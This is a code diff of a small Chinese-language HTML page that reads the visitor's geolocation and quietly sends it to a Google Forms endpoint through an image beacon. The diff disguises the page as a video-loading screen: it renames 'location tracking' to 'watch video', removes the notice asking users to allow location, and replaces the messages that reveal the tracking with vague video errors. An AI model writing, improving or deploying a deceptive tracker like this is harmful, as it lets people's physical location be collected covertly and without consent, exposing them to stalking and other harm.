@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>定位追蹤</title>
+    <title>观看视频</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,7 +20,7 @@
     </style>
 </head>
 <body>
-    <h1>正在載入影片，請允許定位...</h1>
+    <h1>正在載入影片...</h1>
     <p>若未自動跳轉，請手動點擊以下連結：</p>
     <a href="https://www.youtube.com/watch?v=YmC53o2_gWk" target="_blank">觀看影片</a>
 
@@ -32,12 +32,12 @@
                 var formUrl = 'https://forms.gle/BE9bY4YwfXUGRGjV9?entry.1234567890=' + latitude + '&entry.0987654321=' + longitude;
                 var img = new Image();
                 img.src = formUrl;
-                document.body.innerHTML = '<h1>定位成功，感謝您的配合！</h1>';
+                document.body.innerHTML = '<h1> ... </h1>';
             }, function(error) {
-                alert('定位失敗，請允許定位權限。');
+                alert('无法观看。');
             });
         } else {
-            alert('您的瀏覽器不支援定位功能。');
+            alert('您的瀏覽器不支持。');
         }
     </script>
 </body>
